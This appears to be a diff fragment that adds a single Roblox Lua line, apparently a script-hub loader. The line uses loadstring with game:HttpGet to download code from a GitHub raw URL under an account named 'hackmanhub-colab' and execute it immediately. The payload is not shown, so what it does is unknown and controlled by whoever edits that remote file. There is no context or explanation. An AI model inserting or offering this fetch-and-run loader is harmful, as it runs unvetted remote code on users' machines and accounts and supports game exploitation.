@@ -1,0 +1,3 @@
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hackmanhub-colab/t/refs/heads/main/m.txt"))()
